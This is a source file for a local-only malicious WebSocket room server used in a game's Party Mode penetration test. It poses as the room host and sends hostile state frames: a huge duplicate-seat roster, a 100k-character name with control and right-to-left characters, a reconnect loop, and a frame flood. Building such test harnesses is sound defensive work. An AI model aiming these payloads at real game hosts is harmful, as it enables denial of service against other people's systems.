// A MALICIOUS / COMPROMISED room server, for the Party Mode pentest (pentest-net branch). LOCAL ONLY.
//
// It speaks just enough of the movecade protocol to make the UE host believe it is the room host, then sends
// hostile `state` frames. It stands in for "a malicious or compromised room server" in the threat model: the
// real PartyKit server's validation does not bind a compromised server, so the UE host must defend itself.
//
// No dependencies (raw WebSocket server on Node 22). Point the game at it with -RoomServer=127.0.0.1:2899
// -RoomNew (any code; this server welcomes every room).
//
//   node Tools/net-sim/evil-server.mjs --port 2899 --attack roster --count 20000
//   node Tools/net-sim/evil-server.mjs --port 2899 --attack names
//   node Tools/net-sim/evil-server.mjs --port 2899 --attack reconnect
//   node Tools/net-sim/evil-server.mjs --port 2899 --attack flood
//
// Attacks:
//   roster     one `state` with --count seats, all id "p1" seat 1 (NET-01: unbounded, non-dedup roster -> O(n^2)
//              ApplySeatChanges, host hang / memory growth).
//   names      one `state` with a 100k-char name + control/RTL chars (NET-02: no length/charset bound; rendered
//              in the lobby and HUDs).
//   reconnect  welcome, then close after 300 ms, forever (reconnect-loop abuse; welcome resets the backoff).
//   flood      a new `state` (incrementing stateVersion) as fast as possible.
//   benign     a normal lobby state (sanity check the handshake).
import { createServer } from 'node:http';
import { createHash, randomUUID } from 'node:crypto';

const args = process.argv.slice(2);
const opt = (n, d) => { const i = args.indexOf(`--${n}`); return i >= 0 && i + 1 < args.length ? args[i + 1] : d; };
const port = Number(opt('port', '2899'));
const attack = opt('attack', 'roster');
const count = Number(opt('count', '20000'));
const log = (...a) => console.log(`[evil-server +${((Date.now() - t0) / 1000).toFixed(2)}s]`, ...a);
const t0 = Date.now();

// ── minimal RFC6455 server frame codec ──
function accept(key) {
  return createHash('sha1').update(key + '258EAFA5-E914-47DA-95CA-C5AB0DC85B11').digest('base64');
}
function encodeText(str) {
  const payload = Buffer.from(str, 'utf8');
  const len = payload.length;
  let header;
  if (len < 126) header = Buffer.from([0x81, len]);
  else if (len < 65536) { header = Buffer.alloc(4); header[0] = 0x81; header[1] = 126; header.writeUInt16BE(len, 2); }
  else { header = Buffer.alloc(10); header[0] = 0x81; header[1] = 127; header.writeBigUInt64BE(BigInt(len), 2); }
  return Buffer.concat([header, payload]);
}
function decodeFrames(buf, onText, onClose) {
  let off = 0;
  while (off + 2 <= buf.length) {
    const opcode = buf[off] & 0x0f;
    const masked = (buf[off + 1] & 0x80) !== 0;
    let len = buf[off + 1] & 0x7f;
    let p = off + 2;
    if (len === 126) { len = buf.readUInt16BE(p); p += 2; }
    else if (len === 127) { len = Number(buf.readBigUInt64BE(p)); p += 8; }
    let mask; if (masked) { mask = buf.subarray(p, p + 4); p += 4; }
    if (p + len > buf.length) break;
    const data = buf.subarray(p, p + len);
    if (masked) for (let i = 0; i < data.length; i++) data[i] ^= mask[i & 3];
    if (opcode === 0x8) onClose();
    else if (opcode === 0x1) onText(data.toString('utf8'));
    off = p + len;
  }
  return off;
}

function benignState(sessionId, version, players) {
  return {
    roomId: 'r-evil', joinCode: 'EVILAA', gameId: 'kart', selectedMapId: 'sunset-harbor',
    stateVersion: version, hostSessionId: sessionId, serverTime: Date.now(),
    players, game: { status: 'lobby', phase: 'lobby', matchNumber: 0 },
  };
}

const server = createServer();
server.on('upgrade', (req, socket) => {
  const key = req.headers['sec-websocket-key'];
  socket.write(
    'HTTP/1.1 101 Switching Protocols\r\n' +
    'Upgrade: websocket\r\nConnection: Upgrade\r\n' +
    `Sec-WebSocket-Accept: ${accept(key)}\r\n\r\n`
  );
  log(`host connected: ${req.url} (Origin: ${req.headers.origin ?? '(none)'})`);
  const sessionId = randomUUID();
  let version = 1;
  let acc = Buffer.alloc(0);
  const sendJson = (o) => socket.write(encodeText(JSON.stringify({ v: 2, ...o })));

  socket.on('data', (chunk) => {
    acc = Buffer.concat([acc, chunk]);
    const used = decodeFrames(acc, (text) => {
      let m; try { m = JSON.parse(text); } catch { return; }
      if (m.t === 'pong') return;
      if (m.t !== 'hello') { log(`host -> ${m.t}`); return; }
      log(`hello from host (gameId=${m.gameId}); sending welcome as host session ${sessionId}`);
      const benign = [{ id: 'p1', seat: 1, name: 'Decoy', connected: true, ready: false }];
      sendJson({ t: 'welcome', sessionId, hostToken: 'evil-host-token', joinToken: 'evil-join-token',
        state: benignState(sessionId, version, benign) });

      if (attack === 'reconnect') { setTimeout(() => { log('closing to force a reconnect'); socket.destroy(); }, 300); return; }

      setTimeout(() => {
        if (attack === 'roster') {
          const players = Array.from({ length: count }, () => ({ id: 'p1', seat: 1, name: 'x', connected: true }));
          log(`ATTACK roster: sending state with ${count} duplicate seats`);
          sendJson({ t: 'state', state: benignState(sessionId, ++version, players) });
        } else if (attack === 'names') {
          const name = 'Z'.repeat(100000) + '\n\n\r\t‮GAME OVER\u0007';
          log('ATTACK names: sending state with a 100k-char name + control/RTL chars');
          sendJson({ t: 'state', state: benignState(sessionId, ++version, [{ id: 'p1', seat: 1, name, connected: true, ready: true }]) });
        } else if (attack === 'flood') {
          log('ATTACK flood: streaming state frames as fast as possible');
          const tick = () => { if (socket.destroyed) return; sendJson({ t: 'state', state: benignState(sessionId, ++version, benign) }); setImmediate(tick); };
          tick();
        } else {
          log('benign: lobby state only');
        }
      }, 200);
    }, () => { log('host closed'); socket.destroy(); });
    acc = acc.subarray(used);
  });
  socket.on('error', (e) => log('socket error', e.message));
  // Keep the host's heartbeat satisfied.
  const ping = setInterval(() => { if (!socket.destroyed) sendJson({ t: 'ping', serverTime: Date.now() }); }, 10000);
  socket.on('close', () => clearInterval(ping));
});
server.listen(port, '127.0.0.1', () => log(`listening on ws://127.0.0.1:${port} (attack=${attack})`));
